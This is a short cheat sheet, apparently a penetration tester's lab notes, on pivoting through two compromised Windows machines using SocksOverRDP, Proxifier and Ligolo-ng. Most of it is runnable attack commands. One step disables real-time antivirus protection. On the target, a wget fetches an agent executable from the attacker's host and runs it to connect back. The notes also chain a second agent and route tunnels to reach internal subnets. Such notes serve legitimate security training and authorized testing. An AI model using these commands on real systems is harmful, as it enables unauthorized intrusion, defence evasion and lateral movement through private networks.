# Double Pivot


1) Connect via RDP to the initial machine
2) Bring SocksOverRDP.zip and Proxifier.zip to the machine
3) Unzip both
4) Ensure real time protection is disabled and run regsvr32.exe
5) RDP to the second machine and bring over the socksoverrdp-server.exe
6) Run it as admistrator
7) On the initial machine, run proxifier app
8) Under profiles add the loopback:1080 and press ok
9) Then we can access the hidden system, if using RDP rmb to go to experience and set to modem


```cmd-session
regsvr32.exe SocksOverRDP-Plugin.dll
```

### Ligolo

```shell
# On attacker machine:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
cd ~/Downloads/scripts/pivoting/ligolo-ng/
./proxy -selfcert

# On target machine:
wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert

# On attacker machine (in ligolo control panel):
session
<select session number>
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
start

# On second pivot machine
./agent.exe -connect <first machine ip>:11601 -ignore-cert
session
<select session number>

sudo ip tuntap add mode tun appsrv-tunnel
sudo ip link set appsrv-tunnel up
sudo ip route add 172.16.6.0/24 dev appsrv-tunnel

tunnel_start --tun appsrv-tunnel
```
